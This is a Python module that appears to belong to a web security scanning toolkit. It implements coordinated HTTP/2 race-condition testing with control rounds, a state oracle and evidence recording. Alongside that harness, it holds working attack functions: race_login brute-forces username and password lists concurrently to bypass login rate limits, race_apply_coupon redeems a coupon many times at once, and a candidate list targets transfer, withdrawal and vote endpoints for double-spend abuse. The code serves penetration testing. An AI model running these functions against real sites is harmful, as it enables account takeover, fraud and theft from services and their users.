"""
auto_race.py - Automated Race Condition vulnerability scanner
Uses HTTP/2 single-packet attack for rate limit bypass
"""

import asyncio
import copy
import hashlib
import json
import re
import time
from typing import Any, Optional, List, Dict
from urllib.parse import urlparse
from core.probe import _get_session
from core.request_broker import AsyncHttpxRaceTransport
from core.request_broker.artifacts import ArtifactStore
from core.workflow.event_kernel import (
    EvidenceAttestation,
    ReproductionObservation,
    VerdictRecord,
    VerdictStatus,
    VerificationObservation,
)
from core.workflow.event_kernel.service import EventKernel


_SENSITIVE_HEADERS = {
    "authorization",
    "cookie",
    "proxy-authorization",
    "set-cookie",
    "x-api-key",
}


def canonical_evidence_id(workflow_id: str, generation: int, action_id: str, attempt_id: str, evidence_kind: str) -> str:
    """Stable evidence identity independent of payload or artifact content hashes."""
    return f"{workflow_id}:{int(generation)}:{action_id}:{attempt_id}:{evidence_kind}"


def _evidence_digest(value: object) -> str:
    return hashlib.sha256(
        json.dumps(value, sort_keys=True, separators=(",", ":"), default=str).encode("utf-8")
    ).hexdigest()


def persist_race_evidence(
    result: dict,
    *,
    workflow_id: str,
    action_id: str,
    attempt_id: str,
    artifacts: ArtifactStore,
    event_kernel: EventKernel,
    slug: str,
    meta_factory,
    generation: int = 1,
) -> str | None:
    """Persist one post-batch race manifest and bind verified evidence to Event Kernel."""
    status = str(result.get("classification") or "inconclusive").casefold()
    if status not in {item.value for item in VerdictStatus}:
        raise ValueError("race result has an unsupported classification")
    manifest = {
        "workflow_id": workflow_id,
        "generation": generation,
        "action_id": action_id,
        "attempt_id": attempt_id,
        "classification": status,
        "rounds": result.get("rounds", []),
        "evidence": result.get("evidence", {}),
    }
    artifact = artifacts.write(
        {"body": json.dumps(manifest, sort_keys=True, default=str), "kind": "race_manifest"},
        mode="race",
        retention="verified" if status == "verified" else status,
        protected=status == "verified",
    )
    evidence_id: str | None = None
    evidence_ids: tuple[str, ...] = ()
    if status == "verified":
        evidence_id = canonical_evidence_id(workflow_id, generation, action_id, attempt_id, "race")
        metadata = dict(result.get("evidence", {}).get("metadata", {}))
        rounds = list(result.get("rounds", []))
        successful_rounds = sum(bool(item.get("invariant_violated")) for item in rounds)
        event_kernel.attest_evidence(
            slug,
            meta_factory(f"race-attest-{attempt_id[-6:]}"),
            EvidenceAttestation(
                evidence_id=evidence_id,
                evidence_sha256=artifact.digest,
                source_ref_digest=_evidence_digest(manifest),
                action_id=action_id,
                attempt_id=attempt_id,
                generation=generation,
                verifier_id="race-coordinator",
                verifier_version="1",
                verification_policy_digest=_evidence_digest("control+oracle+gate"),
                baseline=VerificationObservation(
                    "control_normal", _evidence_digest("race-control"),
                    _evidence_digest(metadata.get("control_normal")),
                ),
                control=VerificationObservation(
                    "oracle_stable", _evidence_digest("race-oracle"),
                    _evidence_digest(metadata.get("oracle_stable")),
                ),
                reproduction=ReproductionObservation(
                    "invariant_violated", _evidence_digest("race-reproduction"),
                    _evidence_digest(rounds), max(1, len(rounds)), max(1, successful_rounds),
                ),
            ),
        )
        artifacts.register_event_kernel_manifest(artifact.digest, evidence_id)
        evidence_ids = (evidence_id,)
    event_kernel.record_verdict(
        slug,
        meta_factory(f"race-verdict-{attempt_id[-6:]}"),
        VerdictRecord(
            verdict_id=f"race-{attempt_id[-12:]}",
            subject_id=workflow_id,
            action_id=action_id,
            attempt_id=attempt_id,
            status=VerdictStatus(status),
            generation=generation,
            evidence_ids=evidence_ids,
        ),
    )
    return evidence_id


def _parse_spec(value, name: str) -> dict:
    if isinstance(value, dict):
        return copy.deepcopy(value)
    if value in (None, ""):
        return {}
    if not isinstance(value, str):
        raise ValueError(f"{name} must be a JSON object")
    parsed = json.loads(value)
    if not isinstance(parsed, dict):
        raise ValueError(f"{name} must be a JSON object")
    return parsed


def _redact_request(spec: dict) -> dict:
    public = copy.deepcopy(spec)
    headers = public.get("headers")
    if isinstance(headers, dict):
        public["headers"] = {
            key: "REDACTED" if str(key).casefold() in _SENSITIVE_HEADERS else value
            for key, value in headers.items()
        }
    return public


def _with_cookie(spec: dict, session_cookie: str) -> dict:
    current = copy.deepcopy(spec)
    current["method"] = str(current.get("method") or "GET").upper()
    headers = dict(current.get("headers") or {})
    if session_cookie and not any(str(key).casefold() == "cookie" for key in headers):
        headers["Cookie"] = session_cookie
    current["headers"] = headers
    return current


def _same_origin(target: str, url: str) -> bool:
    left = urlparse(target)
    right = urlparse(url)
    return (
        left.scheme.casefold(),
        left.hostname or "",
        left.port or (443 if left.scheme.casefold() == "https" else 80),
    ) == (
        right.scheme.casefold(),
        right.hostname or "",
        right.port or (443 if right.scheme.casefold() == "https" else 80),
    )


def _json_pointer(document: Any, pointer: str):
    if pointer in ("", "/"):
        return document
    if not isinstance(pointer, str) or not pointer.startswith("/"):
        raise ValueError("oracle json_pointer must start with '/'")
    current = document
    for raw_part in pointer[1:].split("/"):
        part = raw_part.replace("~1", "/").replace("~0", "~")
        if isinstance(current, list):
            current = current[int(part)]
        elif isinstance(current, dict):
            current = current[part]
        else:
            raise KeyError(pointer)
    return current


async def _safe_transport_request(transport, spec: dict, *, phase: str, index: int = 0) -> dict:
    started = time.perf_counter()
    try:
        response = await transport.request(spec, phase=phase, index=index)
        if not isinstance(response, dict):
            response = {"body": str(response)}
        response = dict(response)
        response.setdefault("status", 0)
    except Exception as exc:
        response = {"status": 0, "body": "", "error": str(exc)}
    response["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 3)
    return response


async def _settle_oracle(transport, spec: dict, oracle: dict, phase: str) -> dict:
    stable_reads = max(1, min(5, int(oracle.get("stable_reads") or 2)))
    timeout_seconds = max(0.001, min(10.0, float(oracle.get("settle_timeout_ms") or 2000) / 1000))
    interval_seconds = max(0.0, min(2.0, float(oracle.get("settle_interval_ms") or 100) / 1000))
    deadline = time.monotonic() + timeout_seconds
    pointer = str(oracle.get("json_pointer") or "")
    trace = []
    unset = object()
    last = unset
    streak = 0
    reads = 0
    # A stable projection requires the configured number of samples.  On
    # Windows, a short event-loop scheduling delay can otherwise exhaust a
    # small settle timeout after the first read and make a valid oracle look
    # unstable without ever attempting the required confirming read.
    while reads < 200 and (reads < stable_reads or time.monotonic() <= deadline):
        reads += 1
        response = await _safe_transport_request(
            transport,
            spec,
            phase=phase,
            index=reads - 1,
        )
        value = None
        error = str(response.get("error") or "")
        if 200 <= int(response.get("status") or 0) < 300 and not error:
            try:
                value = _json_pointer(json.loads(str(response.get("body") or "")), pointer)
            except (TypeError, ValueError, KeyError, IndexError, json.JSONDecodeError) as exc:
                error = f"oracle projection failed: {exc}"
        trace.append({
            "status": int(response.get("status") or 0),
            "value": value,
            "error": error,
        })
        if not error and value == last:
            streak += 1
        elif not error:
            last = value
            streak = 1
        else:
            streak = 0
        if streak >= stable_reads:
            return {"stable": True, "value": value, "trace": trace}
        if interval_seconds:
            await asyncio.sleep(interval_seconds)
        else:
            await asyncio.sleep(0)
    return {
        "stable": False,
        "value": None if last is unset else last,
        "trace": trace,
    }


async def _coordinated_batch(transport, spec: dict, copies: int) -> dict:
    ready = 0
    ready_lock = asyncio.Lock()
    all_ready = asyncio.Event()
    gate = asyncio.Event()
    dispatch_times = [0.0] * copies

    async def lane(index: int):
        nonlocal ready
        async with ready_lock:
            ready += 1
            if ready == copies:
                all_ready.set()
        await gate.wait()
        dispatch_times[index] = time.perf_counter()
        return await _safe_transport_request(
            transport,
            spec,
            phase="race",
            index=index,
        )

    tasks = [asyncio.create_task(lane(index)) for index in range(copies)]
    await all_ready.wait()
    gate.set()
    responses = await asyncio.gather(*tasks)
    skew_ms = (
        (max(dispatch_times) - min(dispatch_times)) * 1000
        if dispatch_times
        else 0.0
    )
    return {"responses": responses, "dispatch_skew_ms": round(skew_ms, 3)}


def _numeric_effect(before, after, direction: str) -> float:
    if isinstance(before, bool) or isinstance(after, bool):
        raise TypeError("oracle values must be numeric")
    left = float(before)
    right = float(after)
    if direction == "increase":
        return right - left
    if direction == "decrease":
        return left - right
    raise ValueError("oracle direction must be 'increase' or 'decrease'")


async def _run_race_experiment_async(
    target: str,
    request_spec: dict,
    oracle_spec: dict,
    reset_spec: dict,
    session_cookie: str,
    copies: int,
    rounds: int,
    transport,
) -> dict:
    action = _with_cookie(request_spec, session_cookie)
    action.setdefault("url", target)
    oracle_request = _with_cookie(oracle_spec, session_cookie)
    reset_request = _with_cookie(reset_spec, session_cookie)
    maximum = float(oracle_spec.get("maximum_effects", 1))
    direction = str(oracle_spec.get("direction") or "increase").casefold()
    max_skew = float(oracle_spec.get("max_dispatch_skew_ms") or 50)
    round_results = []

    for round_index in range(rounds):
        reset_control = await _safe_transport_request(
            transport, reset_request, phase="reset_control", index=round_index
        )
        if not 200 <= int(reset_control.get("status") or 0) < 400:
            round_results.append({
                "round": round_index + 1,
                "reset_ok": False,
                "oracle_stable": False,
                "gate_verified": False,
                "control_normal": False,
                "invariant_violated": False,
                "error": "control reset request failed",
            })
            break

        baseline = await _settle_oracle(
            transport, oracle_request, oracle_spec, f"oracle_control_baseline_{round_index}"
        )
        if not baseline["stable"]:
            round_results.append({
                "round": round_index + 1,
                "reset_ok": True,
                "oracle_stable": False,
                "gate_verified": False,
                "control_normal": False,
                "invariant_violated": False,
                "oracle_trace": baseline["trace"],
                "error": "control baseline oracle did not stabilize",
            })
            break

        control_responses = []
        for index in range(copies):
            control_responses.append(await _safe_transport_request(
                transport, action, phase="control", index=index
            ))
        control_after = await _settle_oracle(
            transport, oracle_request, oracle_spec, f"oracle_control_after_{round_index}"
        )

        reset_race = await _safe_transport_request(
            transport, reset_request, phase="reset_race", index=round_index
        )
        race_baseline = await _settle_oracle(
            transport, oracle_request, oracle_spec, f"oracle_race_baseline_{round_index}"
        )
        reset_ok = (
            200 <= int(reset_race.get("status") or 0) < 400
            and race_baseline["stable"]
            and race_baseline["value"] == baseline["value"]
        )

        batch = await _coordinated_batch(transport, action, copies)
        race_after = await _settle_oracle(
            transport, oracle_request, oracle_spec, f"oracle_race_after_{round_index}"
        )
        oracle_stable = control_after["stable"] and race_after["stable"] and race_baseline["stable"]
        gate_verified = (
            len(batch["responses"]) == copies
            and not any(int(item.get("status") or 0) == 0 for item in batch["responses"])
            and batch["dispatch_skew_ms"] <= max_skew
        )

        control_effect = None
        race_effect = None
        error = ""
        try:
            if not oracle_stable:
                raise ValueError("oracle did not stabilize")
            control_effect = _numeric_effect(baseline["value"], control_after["value"], direction)
            race_effect = _numeric_effect(race_baseline["value"], race_after["value"], direction)
        except (TypeError, ValueError) as exc:
            error = str(exc)
        control_normal = bool(
            control_effect is not None and 0 <= control_effect <= maximum
        )
        invariant_violated = bool(
            reset_ok
            and oracle_stable
            and gate_verified
            and control_normal
            and race_effect is not None
            and race_effect > maximum
        )
        round_results.append({
            "round": round_index + 1,
            "reset_ok": reset_ok,
            "oracle_stable": oracle_stable,
            "gate_verified": gate_verified,
            "dispatch_skew_ms": batch["dispatch_skew_ms"],
            "control_statuses": [int(item.get("status") or 0) for item in control_responses],
            "race_statuses": [int(item.get("status") or 0) for item in batch["responses"]],
            "baseline": baseline["value"],
            "control_after": control_after["value"],
            "race_baseline": race_baseline["value"],
            "race_after": race_after["value"],
            "control_effect": control_effect,
            "race_effect": race_effect,
            "control_normal": control_normal,
            "invariant_violated": invariant_violated,
            "error": error,
        })

    verified_rounds = sum(1 for item in round_results if item.get("invariant_violated"))
    complete = len(round_results) == rounds
    control_normal = bool(complete and all(item.get("control_normal") for item in round_results))
    oracle_stable = bool(complete and all(item.get("oracle_stable") for item in round_results))
    gate_verified = bool(complete and all(item.get("gate_verified") for item in round_results))
    reset_ok = bool(complete and all(item.get("reset_ok") for item in round_results))

    if complete and rounds >= 3 and verified_rounds == rounds:
        classification = "verified"
        reason = "Race batch exceeded the server-side effect invariant in every reproduced round"
    elif verified_rounds:
        classification = "likely"
        reason = "The invariant was violated but did not satisfy the three-round verification gate"
    elif not (complete and control_normal and oracle_stable and gate_verified and reset_ok):
        classification = "inconclusive"
        reason = "Control, reset, oracle stability, or dispatch gate requirements were not satisfied"
    else:
        classification = "refuted"
        reason = "Concurrent responses did not violate the server-side effect invariant"

    evidence = {
        "request": _redact_request(action),
        "response": {
            "rounds": len(round_results),
            "race_statuses": [item.get("race_statuses", []) for item in round_results],
        },
        "baseline_response": {
            "control_effects": [item.get("control_effect") for item in round_results],
        },
        "payload": json.dumps(_redact_request(action), sort_keys=True, default=str),
        "reproduction_count": verified_rounds,
        "metadata": {
            "control_normal": control_normal,
            "invariant_violated": verified_rounds > 0,
            "oracle_stable": oracle_stable,
            "gate_verified": gate_verified,
            "reset_verified": reset_ok,
            "maximum_effects": maximum,
            "direction": direction,
            "copies": copies,
            "rounds_requested": rounds,
            "transport": "httpx_http2_coordinated_dispatch",
        },
    }
    return {
        "mode": "experiment",
        "target": target,
        "classification": classification,
        "vulnerable": classification == "verified",
        "reason": reason,
        "copies": copies,
        "rounds": round_results,
        "evidence": evidence,
        "findings": ([{
            "type": "race_invariant_violation",
            "severity": "high",
            "reproductions": verified_rounds,
            "maximum_effects": maximum,
        }] if classification == "verified" else []),
    }


def run_race_experiment(
    target: str,
    request_spec: dict,
    oracle_spec: dict,
    reset_spec: dict,
    session_cookie: str = "",
    copies: int = 10,
    rounds: int = 3,
    transport=None,
) -> dict:
    """Run comparable sequential and concurrent workloads against a state oracle."""
    request_spec = _parse_spec(request_spec, "request_spec")
    oracle_spec = _parse_spec(oracle_spec, "oracle_spec")
    reset_spec = _parse_spec(reset_spec, "reset_spec")
    if not reset_spec:
        return {
            "mode": "experiment",
            "target": target,
            "classification": "inconclusive",
            "vulnerable": False,
            "reason": "A reset_spec is required to compare control and race from the same initial state",
            "rounds": [],
            "evidence": {"metadata": {"oracle_stable": False, "gate_verified": False}},
            "findings": [],
        }
    if not oracle_spec.get("url") or not oracle_spec.get("json_pointer"):
        raise ValueError("oracle_spec requires url and json_pointer")
    request_spec.setdefault("url", target)
    reset_spec.setdefault("url", target)
    for name, spec in (("request_spec", request_spec), ("oracle_spec", oracle_spec), ("reset_spec", reset_spec)):
        if not _same_origin(target, str(spec.get("url") or "")):
            raise ValueError(f"{name} URL must use the target origin")
    copies = int(copies)
    rounds = int(rounds)
    if not 2 <= copies <= 50:
        raise ValueError("copies must be between 2 and 50")
    if not 1 <= rounds <= 5:
        raise ValueError("rounds must be between 1 and 5")

    owned_transport = transport is None
    selected_transport = transport or AsyncHttpxRaceTransport()

    async def execute():
        try:
            return await _run_race_experiment_async(
                target,
                request_spec,
                oracle_spec,
                reset_spec,
                session_cookie,
                copies,
                rounds,
                selected_transport,
            )
        finally:
            if owned_transport and hasattr(selected_transport, "aclose"):
                await selected_transport.aclose()

    return asyncio.run(execute())


def detect_rate_limit(url: str, param: str = "username", method: str = "POST",
                      attempts: int = 5, delay: float = 0.1,
                      session_cookie: str = "") -> dict:
    """
    Detect if endpoint has rate limiting.
    Returns dict with: rate_limited, limit_count, lockout_window
    """
    session = _get_session()
    if session_cookie:
        session.headers["Cookie"] = session_cookie
    results = {
        "url": url,
        "rate_limited": False,
        "limit_count": 0,
        "responses": []
    }

    for i in range(attempts):
        try:
            if method.upper() == "POST":
                resp = session.post(url, data={param: f"test{i}"}, timeout=10)
            else:
                resp = session.get(url, params={param: f"test{i}"}, timeout=10)

            results["responses"].append({
                "attempt": i + 1,
                "status": resp.status_code,
                "length": len(resp.text),
                "has_rate_limit_msg": any(kw in resp.text.lower() for kw in
                    ['too many', 'rate limit', 'try again', 'locked', 'blocked'])
            })

            if any(kw in resp.text.lower() for kw in ['too many', 'rate limit', 'try again', 'locked']):
                results["rate_limited"] = True
                results["limit_count"] = i + 1
                break

            if resp.status_code == 429:
                results["rate_limited"] = True
                results["limit_count"] = i + 1
                break

        except Exception as e:
            results["responses"].append({"attempt": i + 1, "error": str(e)})

        time.sleep(delay)

    return results


async def _race_request(transport, url: str, data: dict, cookies: dict,
                        method: str = "POST", index: int = 0) -> dict:
    """Single async request for race condition."""
    try:
        headers = {"Cookie": "; ".join(f"{name}={value}" for name, value in sorted(cookies.items()))} if cookies else {}
        spec = {"method": method.upper(), "url": url, "headers": headers}
        if method.upper() == "POST":
            spec["data"] = data
        else:
            spec["params"] = data
        response = await transport.request(spec, phase="legacy_race", index=index)

        return {
            "status": response["status"],
            "success": response["status"] == 302,
            "length": len(response.get("body", "")),
            "redirect": response.get("headers", {}).get("location", "")
        }
    except Exception as e:
        return {"error": str(e)}


async def race_login(url: str, usernames: List[str], passwords: List[str],
                     csrf_token: str = "", session_cookie: str = "",
                     username_field: str = "username",
                     password_field: str = "password",
                     csrf_field: str = "csrf") -> dict:
    """
    Race condition attack on login endpoint.
    Uses HTTP/2 single-packet attack to bypass rate limiting.
    """
    results = {
        "url": url,
        "total_attempts": 0,
        "successful": [],
        "errors": []
    }

    cookies = {}
    if session_cookie:
        cookies["session"] = session_cookie

    transport = AsyncHttpxRaceTransport()
    try:
        tasks = []
        for username in usernames:
            for password in passwords:
                data = {username_field: username, password_field: password}
                if csrf_token:
                    data[csrf_field] = csrf_token
                tasks.append(_race_request(transport, url, data, cookies, index=len(tasks)))

        results["total_attempts"] = len(tasks)
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for resp in responses:
            if isinstance(resp, Exception):
                results["errors"].append(str(resp))
            elif resp.get("success"):
                results["successful"].append(resp)
    finally:
        await transport.aclose()

    return results


async def race_apply_coupon(url: str, coupon: str, concurrent: int = 20,
                            session_cookie: str = "",
                            csrf_token: str = "") -> dict:
    """
    Race condition attack to apply coupon multiple times.
    """
    cookies = {}
    if session_cookie:
        cookies["session"] = session_cookie

    data = {"coupon": coupon}
    if csrf_token:
        data["csrf"] = csrf_token

    results = {
        "url": url,
        "concurrent": concurrent,
        "responses": []
    }

    transport = AsyncHttpxRaceTransport()
    try:
        tasks = [_race_request(transport, url, data, cookies, index=index) for index in range(concurrent)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for resp in responses:
            if isinstance(resp, Exception):
                results["responses"].append({"error": str(resp)})
            else:
                results["responses"].append(resp)
    finally:
        await transport.aclose()

    return results


def detect_race_condition_candidates(url: str, html: str = "") -> dict:
    """
    Analyze page to find race condition attack candidates.
    """
    candidates = []

    # Common patterns that might be vulnerable
    patterns = [
        (r'/login', 'login_rate_limit'),
        (r'/cart/coupon', 'coupon_reuse'),
        (r'/transfer', 'double_spend'),
        (r'/vote', 'vote_duplication'),
        (r'/register', 'registration_race'),
        (r'/withdraw', 'withdrawal_race'),
    ]

    for pattern, attack_type in patterns:
        if re.search(pattern, html, re.IGNORECASE) or pattern in url:
            candidates.append({
                "endpoint": pattern,
                "attack_type": attack_type,
                "description": f"Potential {attack_type.replace('_', ' ')} vulnerability"
            })

    return {
        "url": url,
        "candidates": candidates,
        "count": len(candidates)
    }


def full_scan(url: str, session_cookie: str = "") -> dict:
    """
    Full race condition security scan.
    """
    results = {
        "url": url,
        "rate_limit_detection": None,
        "candidates": None,
        "findings": []
    }

    # 1. Detect rate limiting
    rate_limit = detect_rate_limit(url, session_cookie=session_cookie)
    results["rate_limit_detection"] = rate_limit

    if rate_limit.get("rate_limited"):
        results["findings"].append({
            "type": "rate_limit_detected",
            "severity": "info",
            "details": f"Rate limit at {rate_limit['limit_count']} attempts"
        })

    # 2. Find race condition candidates
    try:
        session = _get_session()
        if session_cookie:
            session.headers['Cookie'] = session_cookie
        resp = session.get(url, timeout=10)
        candidates = detect_race_condition_candidates(url, resp.text)
        results["candidates"] = candidates

        if candidates.get("count", 0) > 0:
            results["findings"].append({
                "type": "race_condition_candidates",
                "severity": "medium",
                "details": f"Found {candidates['count']} potential race condition endpoints"
            })
    except Exception as e:
        results["candidates_error"] = str(e)

    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python auto_race.py <url> [session_cookie]")
        sys.exit(1)

    url = sys.argv[1]
    cookie = sys.argv[2] if len(sys.argv) > 2 else ""
    result = full_scan(url, cookie)
    print(json.dumps(result, indent=2, default=str))
